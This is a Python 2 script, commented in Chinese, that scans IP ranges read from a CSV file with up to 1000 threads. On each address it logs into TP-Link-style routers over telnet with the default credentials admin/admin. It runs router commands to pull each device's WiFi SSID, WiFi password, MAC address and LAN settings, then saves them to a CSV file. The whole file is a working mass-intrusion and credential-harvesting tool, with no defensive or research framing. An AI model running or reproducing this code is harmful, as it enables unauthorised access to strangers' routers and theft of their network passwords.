# coding=utf-8
import threading
import time
import csv
import telnetlib
import os

username = "admin"
password = "admin"
tn = 1000  # 线程数和队列大小
TIMEOUT = 10
# lk = threading.Lock()  # 线程锁，在取队列时使用
fk = threading.Lock()  # 文件锁，在写入wifi信息时使用，确保完整写入一行
  # ip地址队列，将ip动态加入到队列中，节省内存


def ip2num(ip):  # 将ip地址转换为数字
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):  # 将数字转换为ip地址
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8, num & 0x000000ff)


class bThread(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = ip

    def run(self):
        try:
            tn = telnetlib.Telnet(self.ip, timeout=TIMEOUT)
            # Raise EOFError if the connection is closed and no cooked data is available.
            tn.read_until("username:", TIMEOUT)
            tn.write(username + "\n")
            tn.read_until("password:", TIMEOUT)
            tn.write(password + "\n")
            tn.read_until("#", TIMEOUT)
            tn.write("wlctl show\n")
            wlctl = tn.read_until("cmd:SUCC", TIMEOUT)
            tn.write("lan show info\n")
            laninfo = tn.read_until("cmd:SUCC", TIMEOUT)
            tn.close()
            wlctl = dict([x.split("=",1) for x in wlctl.split() if len(x.split("=",1))==2])
            laninfo = dict([x.split("=",1) for x in laninfo.split() if len(x.split("=",1))==2])

            try:
                SSID = wlctl['SSID']
            except:
                SSID = ''
            try:
                Key = wlctl['Key']
            except:
                Key = ''
            try:
                X_TPLINK_MACAddress = laninfo['X_TPLINK_MACAddress']
            except:
                X_TPLINK_MACAddress = ''
            try:
                IPRouters = laninfo['IPRouters']
            except:
                IPRouters = ''
            try:
                IPInterfaceIPAddress = laninfo['IPInterfaceIPAddress']
            except:
                IPInterfaceIPAddress = ''

            if fk.acquire():
                writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                 self.ip,
                                 SSID,
                                 Key,
                                 X_TPLINK_MACAddress,
                                 IPRouters,
                                 IPInterfaceIPAddress))
                csvfile.flush()
                os.fsync(csvfile.fileno())
                fk.release()
            return 1

        except:
            return 0

if __name__ == "__main__":
    count = 0
    sum = 0
    qu = [0 for i in range(tn)]
    t1 = time.time()
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1))

    csvfile = file("wifi-test.csv", 'ab')
    writer = csv.writer(csvfile)
    with open('ip.csv', 'rb') as f:
        reader = csv.reader(f, delimiter=',', quotechar='"')
        for row in reader:
            print ": ".join(row[1:4]).decode("gbk")
            for num in range(ip2num(row[1]), ip2num(row[2]) + 1):
                qu[count] = num2ip(num)
                count += 1
                if count == tn:
                    for ip in qu:
                        bThread(ip).start()
                        time.sleep(0.0002) #保证1个TIMEOUT内最多请求5万次，小于65534个可用端口
                    count = 0
            sum += (ip2num(row[2]) - ip2num(row[1]) + 1)
            print "已处理 %d"%sum + " 个ip；每分钟处理 %.2f" %(sum / (time.time() - t1) * 60) + " 个ip"

        if count > 0:
            for ip in qu[:count]:
                bThread(ip).start()
                time.sleep(0.0002)

    time.sleep(TIMEOUT*2)
    csvfile.close()
    t2 = time.time()
    print "SUCCESS!!!" + time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2))

    with open('timelog.txt', 'wb') as f:
        # noinspection PyTypeChecker
        f.write([time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1)),
                 time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2))])

